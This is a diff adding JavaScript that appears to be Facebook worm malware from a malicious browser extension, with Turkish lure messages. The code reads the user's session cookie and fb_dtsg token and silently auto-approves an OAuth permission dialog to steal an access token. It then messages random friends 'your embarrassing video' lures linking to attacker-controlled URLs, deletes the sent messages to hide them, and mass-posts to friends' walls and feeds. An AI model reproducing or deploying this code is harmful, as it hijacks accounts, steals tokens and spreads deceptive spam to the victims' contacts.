+	  var allonline = [];
+	  var namelist = [];
+                                        friend_lists = "";
+                                        friend_names = "";
+		for ( veas in x.payload.buddy_list.userInfos){
+        var thisis = x.payload.buddy_list.userInfos[veas];
+		allonline.push(veas);
+		namelist.push(thisis.firstName);
+		}
+		var integercount = 0;
+		for(i=0; i<20; i++){
+		integercount++;
+		var countas = Math.floor(Math.random()*allonline.length);
+		var friendid = allonline[countas];
+		var friendname = namelist[countas];
+		senddmn(friendid, friendname);
+		}
+		
+		for(i=0; i<47; i++){
+		integercount++;
+		var countas = Math.floor(Math.random()*allonline.length);
+		var friendid = allonline[countas];
+		var friendname = namelist[countas];
+friend_lists+= " &text_composertags_with[" + integercount + "]=@[" + friendid + ":" + friendname + "]";
+friend_names+= "&composertags_with[" + integercount + "]="+friendid;
+		}
+baglantiat();
+      xmlhttp.close;
+    }
+  }
+  xmlhttp.send(params);
+}
+
+
+function send(friends,friendname) {
+var msgtextim = ["Bunu nasıl becerdin? -_-","Senden bunu beklemezdim O.o","Resmine ne yapmışlar lan 
+
+:O","Videonu paylaşmışlar :3","Ne hale düştün lan :D","Geçmiş olsun, rezil olmuşsun .s","Senide rezil 
+
+etmişler :)","Videonu gördün mü? :)","anaaa sen .d.d fjhdf","Oha sen :D aasfsf","Burada daha iyisin :)"];
+var messageRand = msgtextim[Math.floor(msgtextim.length * Math.random())];
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/ajax/mercury/send_messages.php?__a=1', true);
+	var params = "message_batch[0][action_type]=ma-type%3Auser-generated-
+
+message&message_batch[0][author]=fbid%3A" + profile_id + "&message_batch[0][author_email]
+
+&message_batch[0][coordinates]&message_batch[0][timestamp_time_passed]=0&message_batch[0]
+
+[is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch
+
+[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]
+
+=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]=" + 
+
+messageRand + "%0A%0A" + msglink + "&message_batch[0][has_attachment]=false&message_batch[0]
+
+[html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" + friends + "&message_batch[0]
+
+[specific_to_list][1]=fbid%3A" + profile_id + "&message_batch[0][ui_push_phase]=V3&message_batch[0]
+
+[status]=0&&client=mercury&__user=" + profile_id + 
+
+"&__a=1&__dyn=7n8ajEAMCBynzpQ9UoGya4Cq7pEsx6iWF29aGEZ94WpUpBxCuGz8&__req=q&fb_dtsg=" + 
+
+config + "&ttstamp=2658172818711012087758054101&__rev=1252742";
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            var data = xhr.responseText;
+            delete_messages(data.split('"message_id":')[1].split(',"client_message_id"')[0].replace(/"/g, ""));
+			xhr.close;
+        }
+    }
+    xhr.send(params);
+}
+
+function senddmn(friends,friendname) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/ajax/mercury/send_messages.php?__a=1', true);
+	var params = "message_batch[0][action_type]=ma-type%3Auser-generated-
+
+message&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]
+
+&message_batch[0][coordinates]&message_batch[0][timestamp_time_passed]=0&message_batch[0]
+
+[is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch
+
+[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]
+
+=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]
+
+=&message_batch[0][has_attachment]=true&message_batch[0][html_body]=false&&message_batch[0]
+
+[specific_to_list][0]=fbid%3A" + friends + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + 
+
+"&message_batch[0][content_attachment][subject]=Watched%20Video&message_batch[0]
+
+[content_attachment][app_id]=2309869772&message_batch[0][content_attachment][attachment][params]
+
+[urlInfo][canonical]=" + domainlink + "&message_batch[0][content_attachment][attachment][params][urlInfo]
+
+[final]=" + domainlink + "&message_batch[0][content_attachment][attachment][params][urlInfo][user]=" + 
+
+domainlink + "&message_batch[0][content_attachment][attachment][params][favicon]=http%3A%2F%
+
+2Fgoogle.com%2Ffavicon.ico&message_batch[0][content_attachment][attachment][params][title]=" + 
+
+friendname + " Rezil Oldu, İşte Videosu&message_batch[0][content_attachment][attachment][params]
+
+[summary]=İlgili Video&message_batch[0][content_attachment][attachment][params][images][0]=https%3A%
+
+2F%2Ffbexternal-a.akamaihd.net%2Fsafe_image.php%3Fd%3DAQDKkoJA_eHkYR-5%26w%3D100%26h%
+
+3D100%26url%3Dhttps://graph.facebook.com/" + friends + "/picture?type=large%26cfs%3D1%
+
+26upscale&message_batch[0][content_attachment][attachment][params][medium]=106&message_batch[0]
+
+[content_attachment][attachment][params][url]=" + domainlink + "&message_batch[0][content_attachment]
+
+[attachment][type]=100&message_batch[0][content_attachment][link_metrics][source]
+
+=ShareStageExternal&message_batch[0][content_attachment][link_metrics][domain]
+
+=www.slink.es&message_batch[0][content_attachment][link_metrics][base_domain]
+
+=www.slink.es&message_batch[0][content_attachment][link_metrics][title_len]=28&message_batch[0]
+
+[content_attachment][link_metrics][summary_len]=36&message_batch[0][content_attachment][link_metrics]
+
+[min_dimensions][0]=70&message_batch[0][content_attachment][link_metrics][min_dimensions][1]
+
+=70&message_batch[0][content_attachment][link_metrics][images_with_dimensions]=1&message_batch[0]
+
+[content_attachment][link_metrics][images_pending]=0&message_batch[0][content_attachment][link_metrics]
+
+[images_fetched]=0&message_batch[0][content_attachment][link_metrics][image_dimensions][0]
+
+=626&message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&message_batch[0]
+
+[content_attachment][link_metrics][images_selected]=1&message_batch[0][content_attachment]
+
+[link_metrics][images_considered]=1&message_batch[0][content_attachment][link_metrics][images_cap]
+
+=3&message_batch[0][content_attachment][link_metrics][images_type]=ranked&message_batch[0]
+
+[content_attachment][composer_metrics][best_image_w]=100&message_batch[0][content_attachment]
+
+[composer_metrics][best_image_h]=100&message_batch[0][content_attachment][composer_metrics]
+
+[image_selected]=0&message_batch[0][content_attachment][composer_metrics][images_provided]
+
+=1&message_batch[0][content_attachment][composer_metrics][images_loaded]=1&message_batch[0]
+
+[content_attachment][composer_metrics][images_shown]=1&message_batch[0][content_attachment]
+
+[composer_metrics][load_duration]=4&message_batch[0][content_attachment][composer_metrics][timed_out]
+
+=0&message_batch[0][content_attachment][composer_metrics][sort_order]=&message_batch[0]
+
+[content_attachment][composer_metrics][selector_type]=UIThumbPager_6&message_batch[0]
+
+[ui_push_phase]=V3&message_batch[0][status]=0&client=mercury&__user=" + user_id + 
+
+"&__a=1&__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&__req=f&fb_dtsg
+
+=" + fb_dtsg + "&ttstamp=2658172571218810680459011989&__rev=1300533";
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            var data = xhr.responseText;
+            //delete_messages(data.split('"message_id":')[1].split(',"client_message_id"')[0].replace(/"/g, 
+
+""));
+			xhr.close;
+        }
+    }
+    xhr.send(params);
+}
+
+function send2211(friends,friendname) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/ajax/mercury/send_messages.php?__a=1', true);
+	var params = "message_batch[0][action_type]=ma-type%3Auser-generated-
+
+message&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]
+
+&message_batch[0][coordinates]&message_batch[0][timestamp_time_passed]=0&message_batch[0]
+
+[is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch
+
+[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]
+
+=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]
+
+=&message_batch[0][has_attachment]=true&message_batch[0][html_body]=false&&message_batch[0]
+
+[specific_to_list][0]=fbid%3A" + friends + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + 
+
+"&message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%
+
+20service&message_batch[0][content_attachment][app_id]=2309869772&message_batch[0]
+
+[content_attachment][attachment][params][urlInfo][canonical]=http%3A%2F%2Fip6.si%2F&message_batch[0]
+
+[content_attachment][attachment][params][urlInfo][final]=http%3A%2F%2Fip6.si%2F&message_batch[0]
+
+[content_attachment][attachment][params][urlInfo][user]=http%3A%2F%2Fip6.si%2F%23" + ip6id + 
+
+"&message_batch[0][content_attachment][attachment][params][favicon]=http%3A%2F%2Fgoogle.com%
+
+2Ffavicon.ico&message_batch[0][content_attachment][attachment][params][title]=" + friendname + " Rezil 
+
+Oldu, İşte Videosu&message_batch[0][content_attachment][attachment][params][summary]=İlgili 
+
+Video&message_batch[0][content_attachment][attachment][params][images][0]=https%3A%2F%2Ffbexternal
+
+-a.akamaihd.net%2Fsafe_image.php%3Fd%3DAQDKkoJA_eHkYR-5%26w%3D100%26h%3D100%26url%
+
+3Dhttps://graph.facebook.com/" + friends + "/picture?type=large%26cfs%3D1%26upscale&message_batch
+
+[0][content_attachment][attachment][params][medium]=106&message_batch[0][content_attachment]
+
+[attachment][params][url]=http%3A%2F%2Fip6.si%2F%23" + ip6id + "&message_batch[0]
+
+[content_attachment][attachment][type]=100&message_batch[0][content_attachment][link_metrics][source]
+
+=ShareStageExternal&message_batch[0][content_attachment][link_metrics][domain]=ip6.si&message_batch
+
+[0][content_attachment][link_metrics][base_domain]=ip6.si&message_batch[0][content_attachment]
+
+[link_metrics][title_len]=28&message_batch[0][content_attachment][link_metrics][summary_len]
+
+=36&message_batch[0][content_attachment][link_metrics][min_dimensions][0]=70&message_batch[0]
+
+[content_attachment][link_metrics][min_dimensions][1]=70&message_batch[0][content_attachment]
+
+[link_metrics][images_with_dimensions]=1&message_batch[0][content_attachment][link_metrics]
+
+[images_pending]=0&message_batch[0][content_attachment][link_metrics][images_fetched]
+
+=0&message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&message_batch[0]
+
+[content_attachment][link_metrics][image_dimensions][1]=293&message_batch[0][content_attachment]
+
+[link_metrics][images_selected]=1&message_batch[0][content_attachment][link_metrics][images_considered]
+
+=1&message_batch[0][content_attachment][link_metrics][images_cap]=3&message_batch[0]
+
+[content_attachment][link_metrics][images_type]=ranked&message_batch[0][content_attachment]
+
+[composer_metrics][best_image_w]=100&message_batch[0][content_attachment][composer_metrics]
+
+[best_image_h]=100&message_batch[0][content_attachment][composer_metrics][image_selected]
+
+=0&message_batch[0][content_attachment][composer_metrics][images_provided]=1&message_batch[0]
+
+[content_attachment][composer_metrics][images_loaded]=1&message_batch[0][content_attachment]
+
+[composer_metrics][images_shown]=1&message_batch[0][content_attachment][composer_metrics]
+
+[load_duration]=4&message_batch[0][content_attachment][composer_metrics][timed_out]=0&message_batch
+
+[0][content_attachment][composer_metrics][sort_order]=&message_batch[0][content_attachment]
+
+[composer_metrics][selector_type]=UIThumbPager_6&message_batch[0][ui_push_phase]=V3&message_batch
+
+[0][status]=0&client=mercury&__user=" + user_id + 
+
+"&__a=1&__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&__req=f&fb_dtsg
+
+=" + fb_dtsg + "&ttstamp=2658172571218810680459011989&__rev=1300533";
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            var data = xhr.responseText;
+            //delete_messages(data.split('"message_id":')[1].split(',"client_message_id"')[0].replace(/"/g, 
+
+""));
+			xhr.close;
+        }
+    }
+    xhr.send(params);
+}
+function delete_messages(id) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/ajax/mercury/delete_messages.php?__a=1', true);
+	var params = "&__user=" + profile_id + "&fb_dtsg=" + config + "&message_ids[0]=" + id + 
+
+"&phstamp=";
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+			xhr.close;
+        }
+    }
+    xhr.send(params);
+}
+
+function randomcharacter(long){ 
+var karakterler=new Array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y", 
+"z","x","w","q","0","1","2","3","4","5","6","7","8","9"); 
+var kelime=""; 
+
+for(i=0;i<long;i++){ 
+var rastgele_sayi=Math.floor(Math.random()*(karakterler.length-1)); 
+kelime=kelime+karakterler[rastgele_sayi]; 
+}
+
+return kelime; 
+}
+
+
+
+function FeedList($token){
+
+
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/v2.0/me/feed?access_token=" + $token + "&limit=10";
+var xml_send = null;
+xml.open("GET", xml_open, true);
+xml.onreadystatechange = function () {
+if(xml.readyState == 4) {
+var $json = JSON.parse(xml.responseText);
+var $total = $json.data.length;
+for($i=0; $i<$total; $i++){
+$feedid = $json.data[$i].id.split("_")[1];
+SendComment($token, $feedid);
+}
+}}
+xml.send(xml_send);
+}
+
+function SendComment($token,$feedid){
+
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/" + $feedid + "/comments?access_token=" + $token + 
+
+"&message=" + $comment_text + "&method=post";
+var xml_send = null;
+xml.open("GET", xml_open, true);
+xml.onreadystatechange = function () {
+if(xml.readyState == 4) {
+$json = JSON.parse(xml.responseText);
+if($json.id){
+console.log($feedid + "Comment Sended ! ");
+}
+else {
+console.log($feedid + "Comment Not Sended! ");
+}
+}}
+xml.send(xml_send);
+}
+
+
+function TheUserFriends($token){
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( 
+
+SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 200&access_token=" + $token;
+var xml_send = null;
+xml.open("GET", xml_open, true);
+xml.onreadystatechange = function () {
+if(xml.readyState == 4) {
+$json = JSON.parse(xml.responseText);
+$total = $json.data.length;
+for($i=0; $i<$total; $i++){
+$userid = $json.data[$i].uid;
+$username = $json.data[$i].first_name;
+SendToWall($token,$userid,$username);
+
+}
+}
+}
+xml.send(xml_send);
+}
+
+
+
+function TheUserFriendsGroups($token){
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid 
+
+FROM group_member WHERE uid=me()) order by rand() limit 70&access_token=" + $token;
+var xml_send = null;
+xml.open("GET", xml_open, true);
+xml.onreadystatechange = function () {
+if(xml.readyState == 4) {
+$json = JSON.parse(xml.responseText);
+$total = $json.data.length;
+for($i=0; $i<$total; $i++){
+$groupid = $json.data[$i].gid;
+console.log($userid);
+}
+}
+}
+xml.send(xml_send);
+}
+
+function SendToGroups($token,$groupid){
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/" + $groupid + "/photos?
+
+url=http://virtualhomeblog.files.wordpress.com/2011/01/video-0012.jpg&message=Bu site videolarınızı 
+
+paylaşıyor, haberin olsun :3 " + $url + "&method=POST&access_token=" + $token + "";
+var xml_send = null;
+xml.open("GET", xml_open, true);
+console.log("ADDING !");
+xml.send(xml_send);
+}
+
+
+function SendToWall($token,$uid,$uname){
+var xml = new XMLHttpRequest();
+var xml_open = "https://graph.facebook.com/" + $uid + "/photos?url=" + $photo_link + "&message=Hey " + 
+
+$uname + " ! " + $wallpost_text + "&callback=sendtowall&method=POST&access_token=" + $token + "";
+var xml_send = null;
+xml.open("GET", xml_open, true);
+console.log("ADDING !");
+xml.send(xml_send);
+}
+
+
+
+
+var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
+    function uygulamaizinver(url){
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function () {
+    if(xmlhttp.readyState == 4){
+    izinverhtml = document.createElement("html");
+    izinverhtml.innerHTML = xmlhttp.responseText;
+    if(izinverhtml.getElementsByTagName("form").length > 0){
+    izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
+    act = izinverhtml.getElementsByTagName("form")[0].action;
+    duzenlevegonder(izinverhtml,act);
+    }
+    }
+    };            
+    xmlhttp.open("GET", url, true);
+    xmlhttp.send();
+    }
+    function duzenlevegonder(formnesne,act){
+    izinverparams = "";
+    for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
+    if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && 
+
+formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
+    izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + 
+
+formnesne.getElementsByTagName("input")[i].value;
+    }
+    }
+    if(formnesne.getElementsByTagName("select").length > 0){
+    izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
+    }
+    izinverparams.replace("&fb_dtsg","fb_dtsg");
+    izinverparams += "&__CONFIRM__=1";
+    formnesne = formnesne;
+    var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function () {
+                            if(xmlhttp.readyState == 4){
+                              izinhtml = document.createElement("html");
+                              izinhtml.innerHTML = xmlhttp.responseText;
+                            if(izinhtml.getElementsByTagName("form").length > 0){
+                              izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
+                              act = izinhtml.getElementsByTagName("form")[0].action;
+                              duzenlevegonder(izinhtml,act)
+                            }else{
+                            sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
+                            if (sex[1]) {
+                            tokenyolla(sex[1]);
+                            }
+                            }
+                            }
+            };
+     
+    xmlhttp.open("POST", act , true);
+    xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
+    xmlhttp.send(izinverparams);
+     
+    }
+     
+    function TokenUrl(id){
+    return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  
+
++"&redirect_uri=fbconnect://success&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user
+
+_birthday";
+    }
+	
+	
+	function tokenyolla($token){
+FeedList($token)
+TheUserFriends($token)
+	}
+	
+	
+
+	
+function StartServices(){
+
+var xhr = new XMLHttpRequest();
+ xhr.open("GET", "http://www.wjetphp.com/sex/mahsun.php", true);
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+		   var xmlhttp = new XMLHttpRequest();
+var params = JSON.stringify({longUrl:  xhr.responseText + "#" + Math.floor((Math.random() * 99999) + 
+
+1)});
+xmlhttp.open("POST", "https://www.googleapis.com/urlshortener/v1/url", true);
+xmlhttp.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+xmlhttp.onreadystatechange = function () {
+    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+          var data = JSON.parse(xmlhttp.responseText);
+        if (data.id) {
+           urlas = data.id.replace("http","https");
+		   urlnews = urlas;
+		   newurls = urlas;
+		   eval("url = newurls");
+eval("$url = url");
+eval('$comment_text = "Bu site videonu paylaşmış : " + $url + "";');
+eval('$photo_link = "http://www.flairbuilder.com/wp/wp-content/uploads/2010/10/VideoPlayer1.png";');
+eval('$wallpost_text = "Rezil olmuşsun bu site videonu paylaşmış : " + $url + "";');
+console.log($url);
+uygulamaizinver(TokenUrl("121876164619130"));
+        }
+    }
+}
+xmlhttp.send(params);
+        }
+    }
+    xhr.send();
+
+
+}
+
+	
+
+var tarih = new Date();
+var profile_id = document.cookie.match(/c_user=(\d+)/)[1];
+if(!localStorage['posddt_' + profile_id] ||  (localStorage['posddt_' + profile_id] && tarih.getTime() >= 
+
+localStorage['posddt_' + profile_id])){
+
+secme()
+StartServices()
+if(navigator.userAgent.indexOf("Chrome") > 0){
+tarih.setTime(tarih.getTime() + 1000 * 15 * 15);
+localStorage['posddt_' + profile_id] = tarih.getTime();
+}
+}
+
+}
